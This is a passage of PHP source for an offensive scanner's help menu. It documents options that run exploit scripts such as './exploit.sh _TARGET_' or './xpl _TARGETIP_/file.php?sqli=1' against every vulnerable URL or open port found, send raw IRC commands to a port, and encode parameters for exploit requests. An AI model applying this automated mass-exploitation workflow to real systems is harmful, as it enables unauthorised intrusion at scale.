 {$_SESSION["c1"]}--sub-cmd-vul{$_SESSION["c0"]} Each vulnerable URL found within the sub-process
     will execute the parameters of this command.
     Example: {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--sub-cmd-all{$_SESSION["c0"]} Run command to each target found within the sub-process scope.
     Example: {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}


 {$_SESSION["c1"]}--port-scan{$_SESSION["c0"]} Defines ports that will be validated as open.
     Example: {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}{ports}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}'22,21,23,3306'{$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--port-cmd{$_SESSION["c0"]} Define command that runs when finding an open door.
     Example: {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_:_PORT_'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_/file.php?sqli=1'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--port-write{$_SESSION["c0"]} Send values for door.
     Example: {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}{'value0','value1','value3'}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$_SESSION["c0"]}



    [!] Modifying values used within script parameters:
    
 {$_SESSION["c1"]}md5{$_SESSION["c0"]} Encrypt values in md5.
     Example: {$_SESSION["c1"]}md5({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}md5({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=md5({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}

 {$_SESSION["c1"]}base64{$_SESSION["c0"]} Encrypt values in base64.
     Example: {$_SESSION["c1"]}base64({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}base64({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=base64({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
         
 {$_SESSION["c1"]}hex{$_SESSION["c0"]} Encrypt values in hex.
     Example: {$_SESSION["c1"]}hex({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}hex({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=hex({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}

 {$_SESSION["c1"]}hex{$_SESSION["c0"]} Generate random values.
     Example: {$_SESSION["c1"]}random({$_SESSION["c2"]}{character_counter}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}random({$_SESSION["c2"]}8{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=random({$_SESSION["c2"]}8{$_SESSION["c1"]})'{$_SESSION["c0"]}

");
}